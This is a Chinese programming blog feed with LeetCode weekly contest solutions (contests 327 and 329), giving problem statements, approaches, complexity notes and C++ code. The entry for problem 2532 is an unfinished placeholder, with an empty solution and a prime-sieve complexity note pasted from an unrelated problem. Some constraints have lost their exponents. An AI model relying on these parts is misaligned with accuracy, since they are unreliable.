<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：stations = [1,2,4,5,0], r = 1, k = 2</span><br><span class="line">输出：5</span><br><span class="line">解释：</span><br><span class="line">最优方案之一是把 2 座供电站都建在城市 1 。</span><br><span class="line">每座城市的供电站数目分别为 [1,4,4,5,0] 。</span><br><span class="line">- 城市 0 的供电站数目为 1 + 4 = 5 。</span><br><span class="line">- 城市 1 的供电站数目为 1 + 4 + 4 = 9 。</span><br><span class="line">- 城市 2 的供电站数目为 4 + 4 + 5 = 13 。</span><br><span class="line">- 城市 3 的供电站数目为 5 + 4 = 9 。</span><br><span class="line">- 城市 4 的供电站数目为 5 + 0 = 5 。</span><br><span class="line">供电站数目最少是 5 。</span><br><span class="line">无法得到更优解，所以我们返回 5 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：stations = [4,4,4,4], r = 0, k = 3</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">无论如何安排，总有一座城市的供电站数目是 4 ，所以最优解是 4 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>n == stations.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>0 &lt;= stations[i] &lt;= 105</code></li>
<li><code>0 &lt;= r &lt;= n - 1</code></li>
<li><code>0 &lt;= k &lt;= 109</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/maximize-the-minimum-powered-city/">https://leetcode.cn/problems/maximize-the-minimum-powered-city/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 二分查找 + 差分数组</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>根据题目给定的数量级即可知道本题一定要用到二分查找，但是存在一定的技巧。我们二分查边枚举可能的最小供电站的最大数目 $val$，每次检测如下:</li>
</ol>
<ul>
<li>我们首先使用差分数组每半径范围的的数组进行处理，这样即可线性时间求出每个城市的供电站的数目；</li>
<li>我们从左向右或者从右向左依次检测每个城市的供电站的数目，如果当前第 $i$ 个城市的变电站的数目为 $cnt$，且少于 $val$，即 $cnt &lt; val$，此时我们需要从 $k$ 中取出 $val - cnt$ 个电站，此时根据左右策略，我们应该将电站建在最右边，即 $i + r$ 处，此时增加的 $val - cnt$ 个电站覆盖的范围为 $[i, i + 2r]$，此时我们需要在差分数组中进行相应的改变，即在 $i + 2r + 1$ 处减去 $val - cnt$。</li>
<li>感觉还算是非常好的面试题目，有一定的技巧性。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log C)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; cnt, <span class="type">int</span> r, <span class="type">long</span> <span class="type">long</span> k, <span class="type">long</span> <span class="type">long</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = cnt.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            curr += cnt[i];</span><br><span class="line">            <span class="keyword">if</span> (curr &lt; val) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> add = val - curr;</span><br><span class="line">                <span class="keyword">if</span> (k &lt; add) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                k -= add;</span><br><span class="line">                <span class="type">int</span> end = <span class="built_in">min</span>(n, i + <span class="number">2</span> * r + <span class="number">1</span>);</span><br><span class="line">                cnt[end] -= add;</span><br><span class="line">                curr += add;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">maxPower</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; stations, <span class="type">int</span> r, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = stations.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">cnt</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> left = <span class="built_in">max</span>(<span class="number">0</span>, i - r);</span><br><span class="line">            <span class="type">int</span> right = <span class="built_in">min</span>(n, i + r + <span class="number">1</span>);</span><br><span class="line">            cnt[left] += stations[i];</span><br><span class="line">            cnt[right] -= stations[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> left = *<span class="built_in">min_element</span>(stations.<span class="built_in">begin</span>(), stations.<span class="built_in">end</span>()); </span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> right = LONG_MAX;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> mid = left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">check</span>(cnt, r, k, mid)) &#123;</span><br><span class="line">                res = mid;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 327</title>
    <url>/2023/01/23/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/93/</url>
    <content><![CDATA[<h2 id="leetcode-contest-327"><a href="#leetcode-contest-327" class="headerlink" title="leetcode  contest 327"></a>leetcode  contest 327</h2><h3 id="2529-正整数和负整数的最大计数"><a href="#2529-正整数和负整数的最大计数" class="headerlink" title="2529. 正整数和负整数的最大计数"></a>2529. 正整数和负整数的最大计数</h3><p>给你一个按 <strong>非递减顺序</strong> 排列的数组 <code>nums</code> ，返回正整数数目和负整数数目中的最大值。</p>
<ul>
<li>换句话讲，如果 <code>nums</code> 中正整数的数目是 <code>pos</code> ，而负整数的数目是 <code>neg</code> ，返回 <code>pos</code> 和 <code>neg</code>二者中的最大值。</li>
</ul>
<p><strong>注意：</strong><code>0</code> 既不是正整数也不是负整数。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [-2,-1,-1,1,2,3]</span><br><span class="line">输出：3</span><br><span class="line">解释：共有 3 个正整数和 3 个负整数。计数得到的最大值是 3 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [-3,-2,-1,0,0,1,2]</span><br><span class="line">输出：3</span><br><span class="line">解释：共有 2 个正整数和 3 个负整数。计数得到的最大值是 3 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [5,20,66,1314]</span><br><span class="line">输出：4</span><br><span class="line">解释：共有 4 个正整数和 0 个负整数。计数得到的最大值是 4 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 2000</code></li>
<li><code>-2000 &lt;= nums[i] &lt;= 2000</code></li>
<li><code>nums</code> 按 <strong>非递减顺序</strong> 排列。</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/maximum-count-of-positive-integer-and-negative-integer/">https://leetcode.cn/problems/maximum-count-of-positive-integer-and-negative-integer/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接统计负数与整数的个数即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$。其中 $n$ 表示给定的数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumCount</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> pCnt = <span class="number">0</span>, nCnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v &lt; <span class="number">0</span>) nCnt++;</span><br><span class="line">            <span class="keyword">if</span> (v &gt; <span class="number">0</span>) pCnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(nCnt, pCnt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2530-执行-K-次操作后的最大分数"><a href="#2530-执行-K-次操作后的最大分数" class="headerlink" title="2530. 执行 K 次操作后的最大分数"></a>2530. 执行 K 次操作后的最大分数</h3><p>给你一个下标从 <strong>0</strong> 开始的整数数组 <code>nums</code> 和一个整数 <code>k</code> 。你的 <strong>起始分数</strong> 为 <code>0</code> 。</p>
<p>在一步 <strong>操作</strong> 中：</p>
<ol>
<li>选出一个满足 <code>0 &lt;= i &lt; nums.length</code> 的下标 <code>i</code> ，</li>
<li>将你的 <strong>分数</strong> 增加 <code>nums[i]</code> ，并且</li>
<li>将 <code>nums[i]</code> 替换为 <code>ceil(nums[i] / 3)</code> 。</li>
</ol>
<p>返回在 <strong>恰好</strong> 执行 <code>k</code> 次操作后，你可能获得的最大分数。</p>
<p>向上取整函数 <code>ceil(val)</code> 的结果是大于或等于 <code>val</code> 的最小整数。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [10,10,10,10,10], k = 5</span><br><span class="line">输出：50</span><br><span class="line">解释：对数组中每个元素执行一次操作。最后分数是 10 + 10 + 10 + 10 + 10 = 50 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,10,3,3,3], k = 3</span><br><span class="line">输出：17</span><br><span class="line">解释：可以执行下述操作：</span><br><span class="line">第 1 步操作：选中 i = 1 ，nums 变为 [1,4,3,3,3] 。分数增加 10 。</span><br><span class="line">第 2 步操作：选中 i = 1 ，nums 变为 [1,2,3,3,3] 。分数增加 4 。</span><br><span class="line">第 3 步操作：选中 i = 2 ，nums 变为 [1,1,1,3,3] 。分数增加 3 。</span><br><span class="line">最后分数是 10 + 4 + 3 = 17 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length, k &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/maximal-score-after-applying-k-operations/">https://leetcode.cn/problems/maximal-score-after-applying-k-operations/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟 + 堆
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>按照题目模拟，我们每次找到数组中的最大元素 $x$，并将 $x$ 变为 $y &#x3D; \lceil \frac{x}{3} \rceil$，并将 $y$ 再次加入到数组中，上述操作执行 $k$ 次即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，其中 $n$ 为数组中的元素的长度。</li>
<li>空间复杂度：$O(n)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">maxKelements</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums) &#123;</span><br><span class="line">            cnt[v]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = cnt.<span class="built_in">rbegin</span>()-&gt;first;</span><br><span class="line">            res += x;</span><br><span class="line">            cnt[x]--;</span><br><span class="line">            <span class="keyword">if</span> (cnt[x] == <span class="number">0</span>) &#123;</span><br><span class="line">                cnt.<span class="built_in">erase</span>(x);</span><br><span class="line">            &#125;</span><br><span class="line">            cnt[(x + <span class="number">2</span>) / <span class="number">3</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2531-使字符串总不同字符的数目相等"><a href="#2531-使字符串总不同字符的数目相等" class="headerlink" title="2531. 使字符串总不同字符的数目相等"></a>2531. 使字符串总不同字符的数目相等</h3><p>给你两个下标从 <strong>0</strong> 开始的字符串 <code>word1</code> 和 <code>word2</code> 。</p>
<p>一次 <strong>移动</strong> 由以下两个步骤组成：</p>
<ul>
<li>选中两个下标 <code>i</code> 和 <code>j</code> ，分别满足 <code>0 &lt;= i &lt; word1.length</code> 和 <code>0 &lt;= j &lt; word2.length</code> ，</li>
<li>交换 <code>word1[i]</code> 和 <code>word2[j]</code> 。</li>
</ul>
<p>如果可以通过 <strong>恰好一次</strong> 移动，使 <code>word1</code> 和 <code>word2</code> 中不同字符的数目相等，则返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：word1 = &quot;ac&quot;, word2 = &quot;b&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：交换任何一组下标都会导致第一个字符串中有 2 个不同的字符，而在第二个字符串中只有 1 个不同字符。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：word1 = &quot;abcc&quot;, word2 = &quot;aab&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：交换第一个字符串的下标 2 和第二个字符串的下标 0 。之后得到 word1 = &quot;abac&quot; 和 word2 = &quot;cab&quot; ，各有 3 个不同字符。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：word1 = &quot;abcde&quot;, word2 = &quot;fghij&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：无论交换哪一组下标，两个字符串中都会有 5 个不同字符。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= word1.length, word2.length &lt;= 105</code></li>
<li><code>word1</code> 和 <code>word2</code> 仅由小写英文字母组成。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/make-number-of-distinct-characters-equal/">https://leetcode.cn/problems/make-number-of-distinct-characters-equal/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于题目给定的元素比较少，我们直接模拟即可，当然枚举分类讨论也可以，但是感觉没有太多必要。由于字符的种类 $|\Sigma| &#x3D; 26$，所以我们直接用哈希统计并遍历所有可能的交换即可，然后比较字符的种类数目即可。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(|\Sigma|^3)$，$|\Sigma|$ 表示字符集的大小。</li>
<li>空间复杂度：时间复杂度为 $O(|\Sigma|)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isItPossible</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; cnt1, cnt2;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> c : word1) &#123;</span><br><span class="line">            cnt1[c]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> c : word2) &#123;</span><br><span class="line">            cnt2[c]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [c1, x1] : cnt1) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> [c2, x2] : cnt2) &#123;</span><br><span class="line">                unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; t1 = cnt1;</span><br><span class="line">                unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; t2 = cnt2;</span><br><span class="line">                t1[c2]++;</span><br><span class="line">                t1[c1]--;</span><br><span class="line">                t2[c1]++;</span><br><span class="line">                t2[c2]--;</span><br><span class="line">                <span class="keyword">if</span> (t1[c1] == <span class="number">0</span>) t1.<span class="built_in">erase</span>(c1);</span><br><span class="line">                <span class="keyword">if</span> (t2[c2] == <span class="number">0</span>) t2.<span class="built_in">erase</span>(c2);</span><br><span class="line">                <span class="keyword">if</span> (t1.<span class="built_in">size</span>() == t2.<span class="built_in">size</span>()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2532-过桥的时间"><a href="#2532-过桥的时间" class="headerlink" title="2532. 过桥的时间"></a>2532. 过桥的时间</h3><p>共有 <code>k</code> 位工人计划将 <code>n</code> 个箱子从旧仓库移动到新仓库。给你两个整数 <code>n</code> 和 <code>k</code>，以及一个二维整数数组 <code>time</code> ，数组的大小为 <code>k x 4</code> ，其中 <code>time[i] = [leftToRighti, pickOldi, rightToLefti, putNewi]</code> 。</p>
<p>一条河将两座仓库分隔，只能通过一座桥通行。旧仓库位于河的右岸，新仓库在河的左岸。开始时，所有 <code>k</code> 位工人都在桥的左侧等待。为了移动这些箱子，第 <code>i</code> 位工人（下标从 <strong>0</strong> 开始）可以：</p>
<ul>
<li>从左岸（新仓库）跨过桥到右岸（旧仓库），用时 <code>leftToRighti</code> 分钟。</li>
<li>从旧仓库选择一个箱子，并返回到桥边，用时 <code>pickOldi</code> 分钟。不同工人可以同时搬起所选的箱子。</li>
<li>从右岸（旧仓库）跨过桥到左岸（新仓库），用时 <code>rightToLefti</code> 分钟。</li>
<li>将箱子放入新仓库，并返回到桥边，用时 <code>putNewi</code> 分钟。不同工人可以同时放下所选的箱子。</li>
</ul>
<p>如果满足下面任一条件，则认为工人 <code>i</code> 的 <strong>效率低于</strong> 工人 <code>j</code> ：</p>
<ul>
<li><code>leftToRighti + rightToLefti &gt; leftToRightj + rightToLeftj</code></li>
<li><code>leftToRighti + rightToLefti == leftToRightj + rightToLeftj</code> 且 <code>i &gt; j</code></li>
</ul>
<p>工人通过桥时需要遵循以下规则：</p>
<ul>
<li>如果工人 <code>x</code> 到达桥边时，工人 <code>y</code> 正在过桥，那么工人 <code>x</code> 需要在桥边等待。</li>
<li>如果没有正在过桥的工人，那么在桥右边等待的工人可以先过桥。如果同时有多个工人在右边等待，那么 <strong>效率最低</strong> 的工人会先过桥。</li>
<li>如果没有正在过桥的工人，且桥右边也没有在等待的工人，同时旧仓库还剩下至少一个箱子需要搬运，此时在桥左边的工人可以过桥。如果同时有多个工人在左边等待，那么 <strong>效率最低</strong> 的工人会先过桥。</li>
</ul>
<p>所有 <code>n</code> 个盒子都需要放入新仓库，请你返回最后一个搬运箱子的工人 <strong>到达河左岸</strong> 的时间。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 1, k = 3, time = [[1,1,2,1],[1,1,3,1],[1,1,4,1]]</span><br><span class="line">输出：6</span><br><span class="line">解释：</span><br><span class="line">从 0 到 1 ：工人 2 从左岸过桥到达右岸。</span><br><span class="line">从 1 到 2 ：工人 2 从旧仓库搬起一个箱子。</span><br><span class="line">从 2 到 6 ：工人 2 从右岸过桥到达左岸。</span><br><span class="line">从 6 到 7 ：工人 2 将箱子放入新仓库。</span><br><span class="line">整个过程在 7 分钟后结束。因为问题关注的是最后一个工人到达左岸的时间，所以返回 6 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 3, k = 2, time = [[1,9,1,8],[10,10,10,10]]</span><br><span class="line">输出：50</span><br><span class="line">解释：</span><br><span class="line">从 0 到 10 ：工人 1 从左岸过桥到达右岸。</span><br><span class="line">从 10 到 20 ：工人 1 从旧仓库搬起一个箱子。</span><br><span class="line">从 10 到 11 ：工人 0 从左岸过桥到达右岸。</span><br><span class="line">从 11 到 20 ：工人 0 从旧仓库搬起一个箱子。</span><br><span class="line">从 20 到 30 ：工人 1 从右岸过桥到达左岸。</span><br><span class="line">从 30 到 40 ：工人 1 将箱子放入新仓库。</span><br><span class="line">从 30 到 31 ：工人 0 从右岸过桥到达左岸。</span><br><span class="line">从 31 到 39 ：工人 0 将箱子放入新仓库。</span><br><span class="line">从 39 到 40 ：工人 0 从左岸过桥到达右岸。</span><br><span class="line">从 40 到 49 ：工人 0 从旧仓库搬起一个箱子。</span><br><span class="line">从 49 到 50 ：工人 0 从右岸过桥到达左岸。</span><br><span class="line">从 50 到 58 ：工人 0 将箱子放入新仓库。</span><br><span class="line">整个过程在 58 分钟后结束。因为问题关注的是最后一个工人到达左岸的时间，所以返回 50 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n, k &lt;= 104</code></li>
<li><code>time.length == k</code></li>
<li><code>time[i].length == 4</code></li>
<li><code>1 &lt;= leftToRighti, pickOldi, rightToLefti, putNewi &lt;= 1000</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-327/problems/time-to-cross-a-bridge/">https://leetcode.cn/contest/weekly-contest-327/problems/time-to-cross-a-bridge/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 优先队列</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示 $right$。我们可以利用经典的素数筛选法求出给定范围的素数即可。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示 $right$，我们需要保存所有小于等于 $right$ 的素数。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 329</title>
    <url>/2023/01/22/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/95/</url>
    <content><![CDATA[<h2 id="leetcode-contest-329"><a href="#leetcode-contest-329" class="headerlink" title="leetcode  contest 329"></a>leetcode  contest 329</h2><p>周赛题目果真放水严重，难度下降很多。<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202301221439783.png"></p>
<h3 id="6296-交替数字和"><a href="#6296-交替数字和" class="headerlink" title="6296. 交替数字和"></a>6296. 交替数字和</h3><p>给你一个正整数 <code>n</code> 。<code>n</code> 中的每一位数字都会按下述规则分配一个符号：</p>
<ul>
<li><strong>最高有效位</strong> 上的数字分配到 <strong>正</strong> 号。</li>
<li>剩余每位上数字的符号都与其相邻数字相反。</li>
</ul>
<p>返回所有数字及其对应符号的和。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 521</span><br><span class="line">输出：4</span><br><span class="line">解释：(+5) + (-2) + (+1) = 4</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 111</span><br><span class="line">输出：1</span><br><span class="line">解释：(+1) + (-1) + (+1) = 1</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 886996</span><br><span class="line">输出：0</span><br><span class="line">解释：(+8) + (-8) + (+6) + (-9) + (+9) + (-6) = 0</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 109</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-329/problems/alternating-digit-sum/">https://leetcode.cn/contest/weekly-contest-329/problems/alternating-digit-sum/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接求出每一位数字的进行计算即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log \max(nums))$。其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">alternateDigitSum</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        string s = <span class="built_in">to_string</span>(n);</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>, curr = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            res += curr * (s[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            curr *= <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

